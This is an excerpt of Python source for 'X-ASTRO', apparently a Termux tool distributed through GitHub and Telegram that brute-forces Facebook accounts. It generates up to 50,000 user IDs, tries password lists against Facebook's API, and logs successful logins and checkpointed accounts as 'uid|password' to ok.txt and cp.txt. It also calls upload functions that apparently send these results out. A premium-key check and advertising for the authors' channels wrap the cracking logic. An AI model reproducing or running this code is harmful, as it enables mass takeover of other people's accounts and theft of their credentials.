...
def helpnote():
	print("%s [*] JOIN OUR TELEGRAM TO KNOW ABOUT UPDATES  :)"%(G))
	subprocess.check_output(["am", "start", "https://github.com/Astro-Hackes/X-ASTRO/blob/main/apv.txt"])
	exit(" [*] TELEGRAM :  https://t.me/Astro_Hackes_Zone")
...
def notice():
	...
	runtxt("\n\033[0;91mYOU ARE NOT A PREMIUM USER ")
	runtxt("\033[0;93m  SENT THIS KEY TO ADMIN >> %s%s"%(G,basesplit))
	runtxt("\033[0;92m ADMIN - ASTRO CODE")
	subprocess.check_output(["am", "start", "https://t.me/Astro_Hackes_Zone"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/Astro-Hackes/X-ASTRO/blob/main/Key.txt').text
			if basesplit in plr:
				key = basesplit
...
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█  Github: https://github.com/Astro-Hackes
█  Telegram : Astro Hackes Zone
█  Admin :  Astro Code >\<
█  Tools :  X-ASTRO
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█""")
		print("%s [%s•%s] %sTOOL NAME : %sX-ASTRO"%(G,R,G,B,G))
	...
	def oldcrack(self):
		...
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO 0key ?  - ASTRO :)"%(R))
		try:
	...
	def fbtua(self):
		...
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO 0okey ? - ASTRO:)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: Sadiya): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[X-ASTRO-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [X-ASTRO-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[X-ASTRO-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [X-ASTRO-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
